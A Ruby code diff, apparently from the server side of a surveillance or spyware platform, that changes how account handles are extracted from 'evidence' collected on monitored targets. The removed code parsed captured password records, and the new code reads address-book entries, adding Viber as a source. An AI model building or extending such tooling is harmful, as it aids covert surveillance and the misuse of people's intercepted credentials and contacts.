@@ -14,72 +14,21 @@ class Accounts
   include Tracer
   extend Tracer
 
-  @@running = false
-
   class << self
 
-    ADDRESSBOOK_TYPE = [:facebook, :twitter, :gmail, :skype, :bbm, :whatsapp, :phone, :mail, :linkedin]
+    ADDRESSBOOK_TYPE = [:facebook, :twitter, :gmail, :skype, :bbm, :whatsapp, :phone, :mail, :linkedin, :viber]
 
-    def retrieve
-      # avoid two thread at the same time
-      # we are called by the eventmachine reactor
-      if @@running
-        trace :debug, "Account retrieval already running, skipping..."
-        return
-      end
+    def add_handle(entity, evidence)
 
-      @@running = true
-
-      count = ::Item.targets.count
-      trace :debug, "Retrieving accounts for #{count} targets"
-
-      ::Item.targets.each do |target|
-
-        # retrieve the entity of this target
-        entity = ::Entity.targets.in(path: [target[:_id]]).first
-
-        # skip if there's nothing new to analyze
-        next if entity[:analyzed]['handles']
-
-        trace :info, "Analyzing entity #{entity.name} for new handles"
-
-        last = entity[:analyzed]['handles_last']
-        last = 0 if last.nil?
-
-        # passwords parsing
-        # here we extract every account that seems an email address
-        Evidence.collection_class(target[:_id]).where({type: 'password', :da.gt => last}).each do |ev|
-          add_handle(entity, ev[:data])
-          last = ev.da if ev.da > last
-        end
-
-        # addressbook
-        # here we extract every account marked as "local" by the addressbook module
-        Evidence.collection_class(target[:_id]).where({type: 'addressbook', 'data.type' => :target, :da.gt => last}).each do |ev|
-          add_handle(entity, ev[:data])
-          last = ev.da if ev.da > last
-        end
-
-        # mark it as analyzed
-        entity[:analyzed] = {'handles' => true, 'handles_last' => last}
-        entity.save
-      end
-
-    ensure
-      @@running = false
-    end
-
-    def add_handle(entity, data)
+      data = evidence[:data]
 
       trace :debug, "Parsing handle data: #{data.inspect}"
 
       # target account in the contacts (addressbook)
       if ADDRESSBOOK_TYPE.include? data['program']
-        unless data['info'].length == 0
-          type = data['program']
-          handle = data['info'].downcase
-          handle = handle.split(':')[1].chomp.strip if handle[":"]
-          create_entity_handle(entity, :automatic, type, handle, data['name'])
+        return if data['type'] != :target
+        if data['handle']
+          create_entity_handle(entity, :automatic, data['program'], data['handle'].downcase, data['name'])
         end
       elsif data['program'] =~ /outlook|mail/i
         # mail accounts from email clients saving account to the device
@@ -146,6 +95,17 @@ class Accounts
       end
 
       return :mail
+    end
+
+    def get_addressbook_handle(evidence)
+      data = evidence[:data]
+
+      if ADDRESSBOOK_TYPE.include? data['program']
+        # don't return data from the target
+        return nil if data['type'].eql? :target
+        return [data['name'], data['program'], data['handle'].downcase] if data['handle']
+      end
+      return nil
     end
 
   end
